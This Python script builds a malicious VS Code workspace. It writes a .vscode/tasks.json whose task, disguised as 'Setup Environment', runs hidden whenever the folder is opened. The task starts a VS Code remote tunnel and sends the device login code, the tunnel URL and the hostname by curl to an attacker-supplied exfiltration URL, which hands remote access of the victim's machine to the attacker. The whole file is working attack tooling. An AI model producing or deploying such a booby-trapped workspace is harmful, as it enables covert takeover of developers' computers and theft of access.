#!/usr/bin/env python3
import json
from pathlib import Path

def create(output_dir, exfil_url):
    # Build the full exfiltration URL (the script already includes /tunnel)
    full_exfil_url = f"{exfil_url}/tunnel"
    
    # The bash script that works on macOS – single line for embedding
    bash_script = f'''OUT_FILE="/tmp/tunnel_output.txt"; EXFIL_URL="{full_exfil_url}"; HOSTNAME=$(hostname); rm -f "$OUT_FILE"; code tunnel > "$OUT_FILE" 2>&1 & TUNNEL_PID=$!; tail -f "$OUT_FILE" | while read line; do line_escaped="${{line//\\"/\\\\\\"}}"; if [[ "$line" =~ use\\ code\\ ([A-Z0-9]{{4}}-[A-Z0-9]{{4}}) ]]; then OTP="${{BASH_REMATCH[1]}}"; curl -s -X POST -H "Content-Type: application/json" -d "{{\\"phase\\":\\"login\\",\\"raw\\":\\"$line_escaped\\",\\"hostname\\":\\"$HOSTNAME\\"}}" "$EXFIL_URL"; elif [[ "$line" =~ (https://vscode.dev/tunnel/[a-zA-Z0-9-]+) ]]; then URL="${{BASH_REMATCH[1]}}"; curl -s -X POST -H "Content-Type: application/json" -d "{{\\"phase\\":\\"tunnel\\",\\"raw\\":\\"$line_escaped\\",\\"hostname\\":\\"$HOSTNAME\\"}}" "$EXFIL_URL"; break; fi; done; wait $TUNNEL_PID 2>/dev/null || true'''

    tasks = {
        "version": "2.0.0",
        "tasks": [
            {
                "label": "Setup Environment",
                "type": "shell",
                "command": "/bin/bash",
                "args": [
                    "-c",
                    bash_script
                ],
                "runOptions": {
                    "runOn": "folderOpen"
                },
                "presentation": {
                    "reveal": "never"
                },
                "problemMatcher": []
            }
        ]
    }

    (output_dir / ".vscode").mkdir(parents=True, exist_ok=True)
    with open(output_dir / ".vscode" / "tasks.json", 'w') as f:
        json.dump(tasks, f, indent=2)
    print("  [✓] .vscode/tasks.json (macOS version – file‑based, live tail, no kill)")
